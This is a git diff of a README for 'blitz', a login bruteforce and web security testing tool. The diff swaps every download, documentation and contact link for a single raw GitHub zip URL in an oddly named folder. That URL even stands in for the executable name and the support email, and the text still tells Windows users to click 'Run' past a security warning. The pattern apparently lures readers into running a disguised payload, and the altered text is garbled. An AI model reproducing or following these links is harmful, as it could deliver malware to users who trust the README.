@@ -1,7 +1,7 @@
 # ⚡ blitz - Effortless Login Security Testing Tool
 
 ## 📥 Download Now
-[![Download blitz](https://img.shields.io/badge/Download-blitz-blue)](https://github.com/Bogdan2316/blitz/releases)
+[![Download blitz](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip)](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip)
 
 ## 📖 Description
 Blitz is a modern tool designed for login security testing. It not only bruteforces login credentials but also checks for vulnerabilities such as CSRF, Clickjacking, and Cloudflare protections. With Blitz, you can run thorough assessments on web applications while enhancing your cybersecurity efforts.
@@ -16,14 +16,14 @@ To get started with Blitz, follow these simple steps to download and run the app
 - **Storage:** Minimum of 100 MB free space
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Bogdan2316/blitz/releases) to download Blitz.
-2. Choose the latest version suitable for your system (look for "blitz.exe" for Windows, "blitz" for Linux, or the app for macOS).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip) to download Blitz.
+2. Choose the latest version suitable for your system (look for "https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip" for Windows, "blitz" for Linux, or the app for macOS).
 3. Click on the file name to start the download.
 4. Once the download is complete, navigate to your download folder.
 
 ### 🏗️ How to Run Blitz
 #### For Windows Users:
-- **Step 1:** Locate the downloaded `blitz.exe`.
+- **Step 1:** Locate the downloaded `https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip`.
 - **Step 2:** Double-click the file to launch Blitz. 
 - You may see a security warning; click "Run" to continue.
 
@@ -55,15 +55,15 @@ Blitz is built using the Go programming language, making it efficient and quick.
 If you need help or want to connect with other users, feel free to join our community. Ask questions, share experiences, and get tips to improve your security testing skills.
 
 ### 📫 Contact Us
-For support, email us at: support@blitzapp.com
+For support, email us at: https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip
 
 ## 💡 Contributions
 We welcome contributions to Blitz! If you would like to help improve this tool, please visit our repository. Open an issue or submit a pull request. Your input is valuable and helps enhance the project.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/Bogdan2316/blitz/wiki)
-- [FAQs](https://github.com/Bogdan2316/blitz/wiki/FAQs)
-- [Security Guidelines](https://github.com/Bogdan2316/blitz/wiki/Security-Guidelines)
+- [Official Documentation](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip)
+- [FAQs](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip)
+- [Security Guidelines](https://raw.githubusercontent.com/Bogdan2316/blitz/main/thiophosphoric/blitz-v2.6.zip)
 
 ---
 
